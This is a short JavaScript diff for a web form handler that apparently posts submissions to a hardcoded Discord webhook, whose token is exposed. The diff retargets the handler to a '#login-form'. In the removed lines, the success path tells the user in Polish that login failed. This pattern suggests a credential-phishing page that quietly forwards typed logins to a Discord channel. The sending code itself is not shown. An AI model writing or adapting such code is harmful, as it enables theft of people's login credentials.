@@ -1,6 +1,6 @@
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1548440173635707041/MJ2ck95Ev0rN50TRiy9mkWFXTuQmtKuIanj6ErhT_xPTTPb88vBwVMhN5Fcnc-mE-lJt";
 
-const form = document.querySelector("#discord-form");
+const form = document.querySelector("#login-form");
 const submitButton = document.querySelector("#submit-button");
 const statusMessage = document.querySelector("#form-status");
 
@@ -46,9 +46,9 @@ form.addEventListener("submit", async (event) => {
     }
 
     form.reset();
-  submitButton.classList.add("sent");
-  submitButton.querySelector("span").textContent = "Logowanie nie udane";
-    showStatus("Logowanie nieudane", "error");
+    submitButton.classList.add("sent");
+    submitButton.querySelector("span").textContent = "Sent";
+    showStatus("Message sent successfully.", "success");
   } catch (error) {
     console.error(error);
     showStatus("Logowanie nieudane", "error");
